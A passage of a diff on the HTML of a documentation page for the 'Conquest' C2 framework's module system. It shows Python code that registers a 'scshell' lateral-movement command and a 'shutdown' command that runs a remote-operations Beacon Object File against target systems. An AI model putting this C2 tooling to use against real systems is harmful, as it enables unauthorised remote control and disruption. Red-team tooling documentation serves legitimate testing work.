+</span></span><span class="line"><span class="cl">        <span class="n">conquest</span><span class="o">.</span><span class="n">execute_alias</span><span class="p">(</span><span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;bof </span><span class="si">{</span><span class="n">bof</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">params</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conquest</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;Failed to open object file: </span><span class="si">{</span><span class="n">bof</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>The handler function is assigned to the command using <code>setHandler</code>.</p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
+</div></div>
+<p>The handler function is assigned to the command using <code>setHandler</code>.</p>
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">14
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span> .setHandler(_scshell)  
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="o">.</span><span class="n">setHandler</span><span class="p">(</span><span class="n">_scshell</span><span class="p">)</span>  </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Unless the handler function of a BOF is highly complex, it is recommended to define the handler as an inline lambda function, as shown for the <code>shutdown</code> command below, as this keeps the module code more concise and clean. Note that the <code>:=</code> is used to assign variables in this case.</p>
+</div></div>
+<p>Unless the handler function of a BOF is highly complex, it is recommended to define the handler as an inline lambda function, as shown for the <code>shutdown</code> command below, as this keeps the module code more concise and clean. Note that the <code>:=</code> is used to assign variables in this case.</p>
 <p>
 
 
@@ -800,116 +752,84 @@
 
 
 
-
-
-
 <figure class="">
-    <div>
-        <img loading="lazy" alt="Shutdown BOF entry point" src=" /img/c2-module-system/4.png">
-    </div>
-    
-</figure>
-
-
-
-
-
-    
-
-
-<div class="color-block content-margin color-block-caption">
-
-    
-<svg
-    xmlns="http://www.w3.org/2000/svg"
-    width="24" height="24" viewBox="0 0 24 24" fill="none"
-    stroke="currentColor" stroke-width="2" stroke-linecap="round"
-    stroke-linejoin="round">
-    <polyline points="17 11 12 6 7 11"></polyline><polyline points="17 18 12 13 7 18"></polyline>
-</svg>
-
-
-
-    <div class="color-block-content">
-        Entry point of the <code>shutdown</code> BOF.
-    </div>
-</div>
+    <img loading="lazy" alt="Shutdown BOF entry point" src="/img/c2-module-system/4.png"><figcaption>Entry point of the `shutdown` BOF.</figcaption></figure>
 </p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>cmd_shutdown = ( 
-</span></span><span style="display:flex;"><span>    conquest.createCommand(name=<span style="color:#0ff;font-weight:bold">&#34;shutdown&#34;</span>, description=<span style="color:#0ff;font-weight:bold">&#34;Shutdown or reboot a target system.&#34;</span>, example=<span style="color:#0ff;font-weight:bold">&#34;shutdown --message </span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold">Goodbye from Conquest</span><span style="color:#0ff;font-weight:bold">\&#34;</span><span style="color:#0ff;font-weight:bold"> --in 20 --reboot&#34;</span>,
-</span></span><span style="display:flex;"><span>                           message=<span style="color:#0ff;font-weight:bold">&#34;Tasked agent to shutdown a computer.&#34;</span>, mitre=[<span style="color:#0ff;font-weight:bold">&#34;T1529&#34;</span>])
-</span></span><span style="display:flex;"><span>            .addArgString(<span style="color:#0ff;font-weight:bold">&#34;target&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Target system (default: local computer).&#34;</span>)
-</span></span><span style="display:flex;"><span>            .addFlagString(<span style="color:#0ff;font-weight:bold">&#34;--message&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;message&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Message to display before shutdown (default: none).&#34;</span>)
-</span></span><span style="display:flex;"><span>            .addFlagInt(<span style="color:#0ff;font-weight:bold">&#34;--in&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;seconds&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Number of seconds before shutdown/reboot (default: 0).&#34;</span>)
-</span></span><span style="display:flex;"><span>            .addFlagBool(<span style="color:#0ff;font-weight:bold">&#34;--close-apps&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;close-apps&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Close all running applications without saving.&#34;</span>)
-</span></span><span style="display:flex;"><span>            .addFlagBool(<span style="color:#0ff;font-weight:bold">&#34;--reboot&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;reboot&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Reboot system after shutdown.&#34;</span>)
-</span></span><span style="display:flex;"><span>            .addFlagBool(<span style="color:#0ff;font-weight:bold">&#34;--confirm&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;confirm&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;Confirm shutdown. This flag acts as a safety net to prevent unwanted shutdowns/reboots&#34;</span>)
-</span></span><span style="display:flex;"><span>            .setHandler(<span style="color:#fff;font-weight:bold">lambda</span> agentId, cmdline, args: (
-</span></span><span style="display:flex;"><span>                target := conquest.get_string(args, <span style="color:#ff0;font-weight:bold">0</span>),
-</span></span><span style="display:flex;"><span>                message := conquest.get_string(args, <span style="color:#ff0;font-weight:bold">1</span>),
-</span></span><span style="display:flex;"><span>                seconds := conquest.get_int(args, <span style="color:#ff0;font-weight:bold">2</span>),
-</span></span><span style="display:flex;"><span>                closeApps := conquest.get_bool(args, <span style="color:#ff0;font-weight:bold">3</span>),
-</span></span><span style="display:flex;"><span>                reboot := conquest.get_bool(args, <span style="color:#ff0;font-weight:bold">4</span>),
-</span></span><span style="display:flex;"><span>                confirm := conquest.get_bool(args, <span style="color:#ff0;font-weight:bold">5</span>),
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                conquest.error(agentId, cmdline, <span style="color:#0ff;font-weight:bold">&#34;Set the --confirm flag to shutdown the target system.&#34;</span>) <span style="color:#fff;font-weight:bold">if</span> not confirm
-</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">else</span> (
-</span></span><span style="display:flex;"><span>                    
-</span></span><span style="display:flex;"><span>                    bof := conquest.modules_root() + <span style="color:#0ff;font-weight:bold">&#34;/remote-operations/CS-Remote-OPs-BOF/Remote/shutdown/shutdown.x64.o&#34;</span>,
-</span></span><span style="display:flex;"><span>                    params := conquest.bof_pack(<span style="color:#0ff;font-weight:bold">&#34;zziss&#34;</span>, [
-</span></span><span style="display:flex;"><span>                        target,                 <span style="color:#007f7f"># z: Target system</span>
-</span></span><span style="display:flex;"><span>                        message,                <span style="color:#007f7f"># z: Shutdown message</span>
-</span></span><span style="display:flex;"><span>                        seconds,                <span style="color:#007f7f"># i: Seconds until shutdown</span>
-</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">int</span>(closeApps),         <span style="color:#007f7f"># s: Close apps without saving</span>
-</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">int</span>(reboot)             <span style="color:#007f7f"># s: Reboot after shutdown</span>
-</span></span><span style="display:flex;"><span>                    ]),
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                    conquest.execute_alias(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;bof </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> </span><span style="color:#0ff;font-weight:bold">{</span>params<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>) <span style="color:#fff;font-weight:bold">if</span> os.path.exists(bof)
-</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">else</span> conquest.error(agentId, cmdline, <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Failed to open object file: </span><span style="color:#0ff;font-weight:bold">{</span>bof<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
-</span></span><span style="display:flex;"><span>                )
-</span></span><span style="display:flex;"><span>            ))
-</span></span><span style="display:flex;"><span>).registerToGroup(<span style="color:#0ff;font-weight:bold">&#34;remote operations&#34;</span>)
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cmd_shutdown</span> <span class="o">=</span> <span class="p">(</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">conquest</span><span class="o">.</span><span class="n">createCommand</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;shutdown&#34;</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s2">&#34;Shutdown or reboot a target system.&#34;</span><span class="p">,</span> <span class="n">example</span><span class="o">=</span><span class="s2">&#34;shutdown --message </span><span class="se">\&#34;</span><span class="s2">Goodbye from Conquest</span><span class="se">\&#34;</span><span class="s2"> --in 20 --reboot&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Tasked agent to shutdown a computer.&#34;</span><span class="p">,</span> <span class="n">mitre</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;T1529&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addArgString</span><span class="p">(</span><span class="s2">&#34;target&#34;</span><span class="p">,</span> <span class="s2">&#34;Target system (default: local computer).&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addFlagString</span><span class="p">(</span><span class="s2">&#34;--message&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">,</span> <span class="s2">&#34;Message to display before shutdown (default: none).&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addFlagInt</span><span class="p">(</span><span class="s2">&#34;--in&#34;</span><span class="p">,</span> <span class="s2">&#34;seconds&#34;</span><span class="p">,</span> <span class="s2">&#34;Number of seconds before shutdown/reboot (default: 0).&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addFlagBool</span><span class="p">(</span><span class="s2">&#34;--close-apps&#34;</span><span class="p">,</span> <span class="s2">&#34;close-apps&#34;</span><span class="p">,</span> <span class="s2">&#34;Close all running applications without saving.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addFlagBool</span><span class="p">(</span><span class="s2">&#34;--reboot&#34;</span><span class="p">,</span> <span class="s2">&#34;reboot&#34;</span><span class="p">,</span> <span class="s2">&#34;Reboot system after shutdown.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">addFlagBool</span><span class="p">(</span><span class="s2">&#34;--confirm&#34;</span><span class="p">,</span> <span class="s2">&#34;confirm&#34;</span><span class="p">,</span> <span class="s2">&#34;Confirm shutdown. This flag acts as a safety net to prevent unwanted shutdowns/reboots&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">.</span><span class="n">setHandler</span><span class="p">(</span><span class="k">lambda</span> <span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="n">args</span><span class="p">:</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">target</span> <span class="o">:=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="n">message</span> <span class="o">:=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_string</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="n">seconds</span> <span class="o">:=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_int</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="n">closeApps</span> <span class="o">:=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_bool</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="n">reboot</span> <span class="o">:=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_bool</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="n">confirm</span> <span class="o">:=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">get_bool</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">conquest</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="s2">&#34;Set the --confirm flag to shutdown the target system.&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">confirm</span>
+</span></span><span class="line"><span class="cl">                <span class="k">else</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">                    <span class="n">bof</span> <span class="o">:=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">modules_root</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;/remote-operations/CS-Remote-OPs-BOF/Remote/shutdown/shutdown.x64.o&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">params</span> <span class="o">:=</span> <span class="n">conquest</span><span class="o">.</span><span class="n">bof_pack</span><span class="p">(</span><span class="s2">&#34;zziss&#34;</span><span class="p">,</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">target</span><span class="p">,</span>                 <span class="c1"># z: Target system</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">message</span><span class="p">,</span>                <span class="c1"># z: Shutdown message</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">seconds</span><span class="p">,</span>                <span class="c1"># i: Seconds until shutdown</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">int</span><span class="p">(</span><span class="n">closeApps</span><span class="p">),</span>         <span class="c1"># s: Close apps without saving</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">int</span><span class="p">(</span><span class="n">reboot</span><span class="p">)</span>             <span class="c1"># s: Reboot after shutdown</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">]),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="n">conquest</span><span class="o">.</span><span class="n">execute_alias</span><span class="p">(</span><span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;bof </span><span class="si">{</span><span class="n">bof</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">params</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">bof</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">else</span> <span class="n">conquest</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">agentId</span><span class="p">,</span> <span class="n">cmdline</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;Failed to open object file: </span><span class="si">{</span><span class="n">bof</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">registerToGroup</span><span class="p">(</span><span class="s2">&#34;remote operations&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div>
+</div></div>
+
 <h3 id="command-registration" class="header-anchor-wrapper">Command Registration
   <a href="#command-registration" class="header-anchor-link">
     <svg width="16px" height="16px" viewBox="0 0 24 24">
@@ -926,96 +846,96 @@
 </h3>
 
 <p>In order to be able to actually use the defined command, it needs to be added to a command group using the <code>registerToGroup</code> API. If the group name passed to the function does not exist, a new group with that name will be created.</p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
+<div class="code-block"><div class="highlight"><div class="chroma">
+<table class="lntable" class="mc-table"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">15
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span> ).registerToGroup(<span style="color:#0ff;font-weight:bold">&#34;lateral movement&#34;</span>)
-</span></span></code></pre></td></tr></table>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"> <span class="p">)</span><span class="o">.</span><span class="n">registerToGroup</span><span class="p">(</span><span class="s2">&#34;lateral movement&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>Overall, the full <code>scshell.py</code> module looks as follows.</p>
-<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;" class="mc-table"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
